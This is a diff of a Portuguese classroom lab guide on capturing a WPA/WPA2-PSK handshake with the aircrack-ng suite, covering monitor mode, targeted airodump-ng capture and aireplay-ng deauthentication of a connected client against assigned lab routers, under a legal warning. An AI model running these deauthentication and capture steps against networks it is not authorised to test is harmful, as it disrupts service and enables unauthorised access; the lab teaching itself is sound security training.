@@ -4,7 +4,6 @@
 > **Aula:** 08 — Captura de Handshake e Ataque de Dicionário em WPA/WPA2-PSK (AES e AES+TKIP)
 > **Equipamentos homologados:** TP-Link Archer C50 (W) e TP-Link Archer EC220-G5 (configurados pelos alunos em **WPA-Pessoal** e **WPA2-Pessoal**, cifras **AES** e **AES+TKIP**)
 > **Estação de ataque:** Kali Linux + placa de rede wireless compatível com modo monitor/injeção
-
 ---
 
 ## ℹ️ Informações do Documento
@@ -30,7 +29,6 @@
 | YouTube — Bora para Prática | https://www.youtube.com/boraparapratica |
 | LinkedIn — Robson Vaamonde | https://www.linkedin.com/in/robson-vaamonde-0b029028/ |
 | GitHub — Procedimentos em TI | https://github.com/vaamonde |
-
 ---
 
 ## ⚠️ Aviso Legal e Ético — Leia Antes de Iniciar
@@ -40,7 +38,6 @@
 > A utilização das técnicas aqui descritas contra redes de terceiros, sem autorização formal, configura crime previsto no **Código Penal Brasileiro** (arts. 154-A e 154-B — invasão de dispositivo informático; art. 266 — interrupção de serviço telemático; arts. 155 e 157 — subtração de coisa alheia), além de responsabilidade civil (Código Civil, arts. 927 a 943).
 >
 > Cada grupo deve atacar **somente** o Access Point que lhe foi atribuído no laboratório.
-
 ---
 
 ## 📑 Sumário
@@ -81,33 +78,35 @@
 ### 🔧 Procedimento
 
 ```bash
-# Verificar reconhecimento da placa/antena wireless
-iwconfig
-lsusb
+# Verificar se a interface wireless foi reconhecida
+sudo iwconfig
 
-# Finalizar processos conflitantes
-airmon-ng check
-airmon-ng check kill
+# Verificar detalhes da placa (fabricante/chipset)
+sudo lsusb
 
-# Habilitar modo monitor
-airmon-ng start wlan0
+# Verificar o status de processos de gerenciamento da Rede Sem-Fio
+# opção do comando airmon-ng: check (List all possible programs that could interfere with the wireless card)
+sudo airmon-ng check
+
+# Finalizando os processos de gerenciamento da Rede Sem-Fio
+# opções do comando airmon-ng: check (List all possible programs that could interfere with the wireless card), 
+# kill (If 'kill' is specified, it will try to kill all of them)
+sudo airmon-ng check kill
+
+# Habilitar o modo monitor da Rede Sem-Fio utilizando a Antena Externa USB
+# opção do comando airmon-ng: start (Enable  monitor  mode on an interface (and specify a channel))
+sudo airmon-ng start wlan1
+
+# Verificando o modo monitor da Rede Sem-Fio utilizando a Antena Externa USB
+sudo iwconfig
 ```
-
-> 💡 **Alternativa (drivers incompatíveis com airmon-ng):**
-> ```bash
-> ifconfig wlan0 down
-> iwconfig wlan0 mode monitor
-> ifconfig wlan0 up
-> iwconfig   # confirmar o modo monitor
-> ```
 
 ### ✅ Testes de Validação
 
 | # | Teste |
 |---|---|
-| 1 | `iwconfig` exibe `wlan0mon` com **Mode:Monitor**. |
+| 1 | `iwconfig` exibe `wlan1mon` com **Mode:Monitor**. |
 | 2 | Nenhum processo do NetworkManager reaparece interferindo na interface. |
-
 ---
 
 ## 03 - Reconhecimento e Identificação da Cifra
@@ -115,7 +114,8 @@ airmon-ng start wlan0
 ### 🔧 Procedimento
 
 ```bash
-airodump-ng wlan0mon
+# Escaneamento da rede utilizando o Airodump-NG em busca de Access Point e End Points
+sudo airodump-ng wlan1mon
 ```
 
 | Campo | Descrição |
@@ -127,8 +127,10 @@ airodump-ng wlan0mon
 | **AUTH** | Tipo de autenticação — deve ser **`PSK`**. Redes com `MGT` usam modo Empresarial e **não podem** ser atacadas por este método (sem captura de handshake PSK válida). |
 | **ESSID** | Nome da rede (SSID) configurado pelo grupo. |
 | **STATION** | Endereço MAC de clientes conectados — necessário para o ataque de desautenticação. |
+---
 
 ➡️ Anotar `BSSID`, `Canal`, `CIPHER` (AES ou AES+TKIP) e ao menos um `STATION` associado.
+---
 
 ### ✅ Testes de Validação
 
@@ -136,7 +138,6 @@ airodump-ng wlan0mon
 |---|---|
 | 1 | O AP do grupo aparece com **ENC = WPA** ou **WPA2** e **AUTH = PSK**. |
 | 2 | Campo `CIPHER` identificado corretamente (CCMP = AES / TKIP CCMP = AES+TKIP). |
-
 ---
 
 ## 04 - Captura Direcionada e Handshake
@@ -144,7 +145,10 @@ airodump-ng wlan0mon
 ### 🔧 Procedimento
 
 ```bash
-airodump-ng -c <CANAL> --bssid <BSSID_DO_AP> -w chavewpa wlan0mon
+# Focar a captura em um único AP/canal para observar as informações de Beacons e Data Sources
+# opção do comando airodump-ng: -c ( Indicates the frequencies to listen to), --bssid (t will only
+# show networks, matching the given bssid), -w (Is  the  dump  file prefix to use)
+sudo airodump-ng -c <CANAL> --bssid <BSSID_DO_AP> -w chavewpa wlan1mon
 ```
 
 | Parâmetro | Descrição |
@@ -152,9 +156,9 @@ airodump-ng -c <CANAL> --bssid <BSSID_DO_AP> -w chavewpa wlan0mon
 | `-c` | Fixa a captura no canal do AP-alvo. |
 | `--bssid` | Filtra a captura apenas para o BSSID informado. |
 | `-w chavewpa` | Prefixo dos arquivos de captura gravados em disco (ex.: `chavewpa-01.cap`), usados posteriormente pelo `aircrack-ng`. |
+---
 
 ➡️ **Deixe esse terminal aberto e rodando.** Diferente do WEP, aqui **não interessa acumular pacotes de dados (`#Data`)** — o único evento relevante é a captura do **4-way handshake**, que ocorre no momento em que um cliente se autentica (ou reautentica) na rede.
-
 ---
 
 ## 05 - Desautenticação do Cliente (Aireplay-ng)
@@ -167,9 +171,10 @@ Como o handshake só é gerado no momento da (re)conexão do cliente, forçamos 
 |---|---|
 | 1 | Abrir um **segundo terminal**, mantendo o `airodump-ng` do passo anterior em execução. |
 | 2 | Rodar o ataque de desautenticação direcionado ao cliente. |
+---
 
 ```bash
-aireplay-ng -0 5 -a <BSSID_DO_AP> -c <MAC_DO_CLIENTE_STATION> wlan0mon
+sudo aireplay-ng -0 5 -a <BSSID_DO_AP> -c <MAC_DO_CLIENTE_STATION> wlan1mon
 ```
 
 | Parâmetro | Descrição |
@@ -189,7 +194,6 @@ aireplay-ng -0 5 -a <BSSID_DO_AP> -c <MAC_DO_CLIENTE_STATION> wlan0mon
 |---|---|
 | 1 | O cliente-alvo perde e recupera a conexão com a rede durante o ataque. |
 | 2 | No terminal do `airodump-ng`, aparece a mensagem **`WPA handshake: <BSSID>`** no canto superior direito da tela. |
-
 ---
 
 ## 06 - Verificando se o Handshake foi Capturado
